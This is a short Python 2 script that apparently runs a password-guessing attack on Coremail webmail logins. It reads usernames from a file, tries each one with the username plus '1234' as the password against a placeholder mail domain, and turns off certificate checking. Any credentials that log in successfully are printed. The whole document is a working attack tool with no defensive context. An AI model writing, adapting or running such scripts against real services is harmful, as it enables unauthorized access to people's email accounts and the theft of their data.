#coding = utf-8
from requests import request
import requests
import sys
import time

class ClmbFuckCoreMail():
    def __init__(self, domain,email, password):
        self.email = email
        self.password = password
        self.mailDomain = domain


    def run(self):
        self.session = requests.Session()
        try:
            self.data = {'local':'zh_CN', 'uid': self.email, 'nodetect':'false', 'password': self.password,'action:login': ''}
            self.url = 'https://' + self.mailDomain + '/coremail/index.jsp?cus=1'
            self.req = self.session.post(self.url,self.data, verify=False)
            if r'cexpand' in self.req.text:
                print self.data
            time.sleep(10)
        except requests.HTTPError as e:
            print e


if __name__ == '__main__':

    with open('email.txt', 'r') as f:
            for emailUser in f.readlines():
                    fuckMail = ClmbFuckCoreMail('mail.xxx.com.cn', emailUser.strip(), emailUser.strip() + '1234')
                    fuckMail.run()
